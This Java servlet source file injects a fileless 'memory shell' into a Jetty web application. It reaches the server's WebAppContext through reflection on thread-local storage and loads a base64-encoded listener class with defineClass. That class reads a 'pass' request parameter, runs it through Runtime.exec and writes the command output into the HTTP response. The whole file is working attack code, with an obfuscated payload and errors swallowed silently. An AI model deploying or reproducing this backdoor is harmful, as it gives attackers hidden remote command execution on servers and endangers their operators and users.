package test;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EventListener;

public class InjectListenerByServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Object var1 = getContext();
            injectMemShell(var1);
        } catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static synchronized Object getContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        Thread thread=Thread.currentThread();
        Field f1=thread.getClass().getDeclaredField("threadLocals");
        f1.setAccessible(true);
        Object o1=f1.get(thread);
        Field f2=o1.getClass().getDeclaredField("table");
        f2.setAccessible(true);
        Object o3=f2.get(o1);

        Class var7 = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
        Field var8 = var7.getDeclaredField("value");
        var8.setAccessible(true);
        Object var9 = null;
//        ThreadLocal.ThreadLocalMap.Entry[] o3=(ThreadLocal.ThreadLocalMap.Entry[]) f2.get(o1);

        for(int var11 = 0; var11 < Array.getLength(o3); ++var11) {
            Object var10 = Array.get(o3, var11);
            if (var10 != null) {
                var9 = var8.get(var10);
                if (var9 != null && var9.getClass().getName().equals("org.eclipse.jetty.webapp.WebAppContext$Context")) {
                    Field f3=var9.getClass().getDeclaredField("this$0");
                    f3.setAccessible(true);
                    Object o4=f3.get(var9);
                    return o4; //WebAppContext
                }
            }
        }
        return null;
    }

    public static synchronized void injectMemShell(Object context){
        try{
            Object MEMSHELL_OBJECT=injectMemShellClass();
            // WebAppContext -> ServletContextHandler -> ContextHandler
            Method var3 =context.getClass().getSuperclass().getSuperclass().getDeclaredMethod("addEventListener",EventListener.class);
            var3.setAccessible(true);
            var3.invoke(context, MEMSHELL_OBJECT);
        }catch(Exception e){

        }
    }

    public static Object injectMemShellClass() {
        try {
            Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var1.setAccessible(true);
            byte[] var2 = (new BASE64Decoder()).decodeBuffer("yv66vgAAADQA2woAKgB0CgB1AHYHAHcKADAAeAgAeQsAAwB6CgAwAHsJAHwAfQoAfgB/CwAlAIAKAIEAggcAgwoAhACFCgCEAIYKAIcAiAcAiQoAEACKBwCLCgASAIwHAI0KABQAdAoAEgCOBwCPCgAXAHQKABcAkAgAkQoAFwCSCgAUAJMKABQAkgoAKgCUCACVCgAnAJYKAJcAmAoAlwCZCgAnAJoIAJsHAJwIAJ0HAJ4KACcAnwoAoACYBwChCgCgAKIHAKMHAKQHAKUKAKYApwcAqAcAqQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAMTE15TGlzdGVuZXI7AQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQATc2VydmxldFJlcXVlc3RFdmVudAEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAScmVxdWVzdEluaXRpYWxpemVkAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBAA1TdGFja01hcFRhYmxlBwCoBwCqBwB3BwCcBwCrBwCDAQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAKwHAK0HAK4HAIkHAIsHAI0BAApFeGNlcHRpb25zAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAmYxAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAAm8xAQASTGphdmEvbGFuZy9PYmplY3Q7AQACZjIBAAR2YXIxAQACbzIBABdnZXRSZXNwb25zZUZyb21SZXF1ZXN0MgEAAm0xAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAoTGphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uOwEABHZhcjIHAK8BAApTb3VyY2VGaWxlAQAPTXlMaXN0ZW5lci5qYXZhDAAyADMHAKoMALAAsQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAGIAYwEABHBhc3MMALIATQwATABNBwCzDAC0ALUHALYMALcAuAwAuQC6BwC7DAC8ALgBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwCsDAC9AL4MAL8AwAcArQwAwQDCAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAMgDDAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAMgDEAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAxQDGAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAMcAyAEAAQoMAMkAxgwAxwDKDADLAMwBAAhfY2hhbm5lbAwAzQDOBwDPDADQANEMANIA0wwA1ADMAQAJX3Jlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwA1QDWBwDXAQAQamF2YS9sYW5nL09iamVjdAwA2ADZAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcArwwA2gAzAQAKTXlMaXN0ZW5lcgEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAJmphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uAQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEADGdldFBhcmFtZXRlcgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UAIQAwACoAAQAxAAAABgABADIAMwABADQAAAAvAAEAAQAAAAUqtwABsQAAAAIANQAAAAYAAQAAAAwANgAAAAwAAQAAAAUANwA4AAAAAQA5ADoAAQA0AAAANQAAAAIAAAABsQAAAAIANQAAAAYAAQAAABAANgAAABYAAgAAAAEANwA4AAAAAAABADsAPAABAAEAPQA6AAEANAAAAN8AAgAGAAAAOSu2AALAAANNKiy2AAROLBIFuQAGAgA6BCoZBLYABzoFsgAIGQW2AAktuQAKAQAZBbYAC6cABToFsQABABgAMwA2AAwAAwA1AAAAJgAJAAAAFAAIABUADgAWABgAGAAgABkAKAAaADMAHQA2ABsAOAAeADYAAAA+AAYAIAATAD4APwAFAAAAOQA3ADgAAAAAADkAOwA8AAEACAAxAEAAQQACAA4AKwBCAEMAAwAYACEARAA/AAQARQAAABwAAv8ANgAFBwBGBwBHBwBIBwBJBwBKAAEHAEsBAAEATABNAAIANAAAASkAAwAJAAAAYLgADU0sK7YADk4ttgAPOgS7ABBZGQS3ABE6BbsAElkZBbcAEzoGAToHuwAUWbcAFToIGQa2ABZZOgfGACAZCLsAF1m3ABgZB7YAGRIatgAZtgAbtgAcV6f/2xkItgAdsAAAAAMANQAAACoACgAAACEABAAiAAoAIwAQACQAGwAlACYAJgApACcAMgAoAD0AKQBaACsANgAAAFwACQAAAGAANwA4AAAAAABgAEQAPwABAAQAXABOAE8AAgAKAFYAUABRAAMAEABQAFIAUwAEABsARQBUAFUABQAmADoAVgBXAAYAKQA3AFgAPwAHADIALgBZAFoACABFAAAAJQAC/wAyAAkHAEYHAEoHAFsHAFwHAF0HAF4HAF8HAEoHAGAAACcAYQAAAAQAAQAMACEAYgBjAAEANAAAAN4AAgAGAAAAPgFNK7YAHhIftgAgTi0EtgAhLSu2ACI6BBkEtgAetgAjEiS2ACA6BRkFBLYAIRkFGQS2ACLAACVNpwAETiywAAEAAgA4ADsADAADADUAAAAmAAkAAAAvAAIAMgAMADMAEQA0ABgANQAnADYALQA3ADgAOAA8ADkANgAAAD4ABgAMACwAZABlAAMAGAAgAGYAZwAEACcAEQBoAGUABQAAAD4ANwA4AAAAAAA+AGkAQQABAAIAPABqAEMAAgBFAAAAFgAC/wA7AAMHAEYHAEgHAEkAAQcASwAAAQBrAGMAAQA0AAAAzgADAAQAAAAsAU0rtgAeEiYDvQAntgAoTi0EtgApLSsDvQAqtgArwAAlTacACE4ttgAvLLAAAwACACIAJQAsAAIAIgAlAC0AAgAiACUALgADADUAAAAiAAgAAAA9AAIAPwAQAEAAFQBBACIARAAlAEIAJgBDACoARgA2AAAANAAFABAAEgBsAG0AAwAmAAQAbgBvAAMAAAAsADcAOAAAAAAALABpAEEAAQACACoAcABDAAIARQAAABYAAv8AJQADBwBGBwBIBwBJAAEHAHEEAAEAcgAAAAIAcw==");
            Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            Object MEMSHELL_OBJECT = var3.newInstance();
            return MEMSHELL_OBJECT;
        } catch (Exception var4) {
        }
        return null;
    }


}
